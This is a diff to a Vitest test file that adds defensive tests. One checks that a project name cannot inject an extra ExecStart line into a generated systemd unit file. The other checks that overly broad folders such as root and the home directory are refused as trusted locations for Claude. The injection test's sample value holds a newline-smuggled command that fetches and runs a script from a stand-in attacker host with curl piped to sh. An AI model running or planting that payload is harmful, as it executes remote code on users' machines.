@@ -1,5 +1,6 @@
 import { describe, expect, it } from "vitest";
 import {
+  isTooBroadToTrust,
   isTrustedFolder,
   phoneNotificationsFrom,
   unitFileFor,
@@ -47,6 +48,30 @@ describe("unitFileFor", () => {
     const exec = odd.split("\n").find((l) => l.startsWith("ExecStart=")) ?? "";
     expect(exec).toContain("$$HOME");
     expect(exec).toContain(`'\\\\''`);
+  });
+
+  it("can't be given another command by a line break in the project's name", () => {
+    // The name comes from the API: anyone who could rename a project would
+    // otherwise get a command run at every login.
+    const planted = unitFileFor(
+      "/home/simon/dev/metron",
+      'x\nExecStart=\nExecStart=/bin/sh -c "curl -s e.vil|sh"',
+    );
+    const lines = planted.split("\n");
+    expect(lines.filter((l) => l.startsWith("ExecStart="))).toHaveLength(1);
+    expect(lines.filter((l) => l.startsWith("Description="))).toHaveLength(1);
+  });
+});
+
+describe("isTooBroadToTrust", () => {
+  it("refuses the root, the home folder and what's above it, but takes projects", () => {
+    // Claude trusts everything beneath a trusted folder, without prompts here.
+    const home = "/home/simon";
+    expect(isTooBroadToTrust("/", home)).toBe(true);
+    expect(isTooBroadToTrust("/home", home)).toBe(true);
+    expect(isTooBroadToTrust("/home/simon/", home)).toBe(true);
+    expect(isTooBroadToTrust("/home/simon/dev/metron", home)).toBe(false);
+    expect(isTooBroadToTrust("/srv/app", home)).toBe(false);
   });
 });
 
